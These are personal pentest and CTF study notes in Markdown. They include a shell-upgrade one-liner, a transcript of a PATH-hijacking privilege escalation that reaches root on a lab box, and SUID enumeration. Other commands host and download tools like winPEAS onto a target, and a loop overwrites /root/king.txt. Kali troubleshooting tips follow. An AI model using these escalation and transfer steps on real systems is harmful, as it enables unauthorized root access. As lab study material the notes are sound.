# NOTES
STUDY MATERIAL >.&lt;

- [Uncat](#uncat)
- [SERVICES](#services)
- [Tools](#)
  - [Network Scanning](#)
    - [NMAP](#)
  - [WEB DIRECTORY SCANNING](#) 
    - [GOBUSTER](#)
  - []()
  - []()
  - []()
  -   
- []()
- []()
- []()
- []()


# Uncat
MY PENTEST CHEAT SHEET AND BASIC KALI SETUP/TROUBLESHOOT COMMANDS

Linux Tools, Scripts & Services

# 

# Bash Scripts (For CTF)

$ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’  → sh to bash shell

# Exploit PATH Hijacking

matt@pandora:~$ echo "/bin/bash" > tar
matt@pandora:~$ chmod +x tar
matt@pandora:~$ ls
'GCONV_PATH=.'   [setup.sh](http://setup.sh/)   tar   user.txt   value   wget-log
matt@pandora:~$ export PATH=$(pwd):$PATH
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# whoami
root

Enumeration for SUID files $ find / -user root -perm -4000 -exec ls -ldb {} ; >/tmp/suidfiles

Enumeration for user executable location $ find / -type d -maxdepth 2 -writable -exec ls -l {} + 2>/dev/null

$ find / -type d -maxdepth 2 -writable -exec ls -l {} 2> + /dev/null (THIS ONE DOSENT WORKS)
/ : Scan the entire device
-type d : Scan for directories only (No files)
-maxdepth : The max depth (subfolders) to scan
-writable : Check if current user an write in folder
-exec : Execute a command on the results returned by find ls
-l {} + : List the output in long form ( {} is placeholder for the location where result of the find command is substituted. The + at the end is used to terminate the -exec command)

$ python3 -m http.server {port} (ip before port is optional i guess) - host file to download on target system, File should be in the same folder where the hosting service is started

$ wget {ip}:port/filename

$ “curl” is more likely to read the content of files in linux whereas wget is to download the files!!!

$ curl –head {IP} - To get the header of the website..
for eg. i got “X-Backend-Server: office.paper” for 10.10.11.143 so i added this ip in /etc/hosts following with the IP like this “10.10.11.143 office.paper” and then went to search [http://office.paper](http://office.paper/) and the i got the website running which was earlier showing default apache page bcos it was not set up.

$ powershell “curl|wget” http://10.0.0.1/winPEASx64.exe -outfile winPEASx64.exe

# FOR CTF :

Finding total flags xD (ctf ezz) $ find / -name flag.txt 2> /dev/null

while true; do echo “yassk” > /root/king.txt; done &



==========================================================================================

KALI LINUX TROUBLE-SHOOTS AND BASICS

1. Unable to download or install packages using "apt-get"
    
    file path = /etc/apt/sources.list
    
    We have to uncomment 2nd source link in sources.list file to be able to use "sudo apt-get install" command.
    After uncommenting use "sudo apt-get update" to update the changes and reflect in our kali system. Then re-run the command not working
    
2. Shells
    
    echo $SHELL -  to print current shell
    
    chsh - to change the current shell.
    
    There are couple of shells in kali from which we can use, currently zsh is by default in my machine.
    
3. Update kali to latest version
    
    kali@kali:~$sudo apt update
    
    kali@kali:~$ sudo apt full-upgrade -y


# SERVICES

# Tools
## NetworkScanning
### NMAP
    

